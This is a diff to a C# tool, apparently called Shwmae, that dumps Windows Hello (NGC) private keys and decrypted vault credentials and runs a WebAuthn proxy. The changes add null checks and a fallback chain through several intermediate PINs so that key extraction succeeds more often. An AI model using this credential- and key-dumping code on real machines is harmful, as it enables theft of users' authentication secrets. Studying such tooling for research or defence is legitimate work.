@@ -125,7 +125,7 @@ namespace Shwmae {
 
                 Console.WriteLine("\n  ** Credentials **");
 
-                var ngcVaultKey = ngcContainer.Keys.FirstOrDefault(k => k.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");
+                var ngcVaultKey = ngcContainer.Keys.FirstOrDefault(k => k != null && k.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");
 
                 if (ngcVaultKey == null) {
                     Console.WriteLine("    No vault key available with ID //9DDC52DB-DC02-4A8C-B892-38DEF4FA748F");
@@ -157,6 +157,10 @@ namespace Shwmae {
                 Console.WriteLine("\n  ** Keys **");
 
                 foreach (var ngcKey in ngcContainer.Keys) {
+
+                    if (ngcKey == null)
+                        continue;
+
                     Console.WriteLine();
                     Console.WriteLine($"    Name             : {ngcKey.Name}{(ngcKey.Name == "//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F" ? " (Vault Key)" : "")}");
                     Console.WriteLine($"    Provider         : {ngcKey.Provider}");
@@ -254,6 +258,7 @@ namespace Shwmae {
                     listener.DecryptedCredentials = decryptedVaultCreds;
                     listener.Containers = ngcContainers;
 
+                    Console.WriteLine("[=] WebAuthn proxy running, press enter to exit");
                     Console.ReadLine();
 
                 }else if (baseOptions is KeyOptions keyOptions) {
@@ -304,7 +309,16 @@ namespace Shwmae {
                         try {
                             keyData = key.Dump(new NgcPin(protector.SignPin), systemKeyProvider);
                         } catch (CryptographicException) {
-                            keyData = key.Dump(new NgcPin(protector.DecryptPin), systemKeyProvider);
+                            try {
+                                keyData = key.Dump(new NgcPin(protector.DecryptPin), systemKeyProvider);
+                            }catch(CryptographicException) {
+                                try {
+                                    keyData = key.Dump(new NgcPin(protector.ExternalPin), systemKeyProvider);
+                                }catch(CryptographicException ce) {
+                                    Console.WriteLine($"[!] Failed to dump key with id {key.Name}, none of the intermediate PIN's worked");
+                                    return;
+                                }
+                            }
                         }
 
                         Console.WriteLine("-----BEGIN PRIVATE KEY-----");
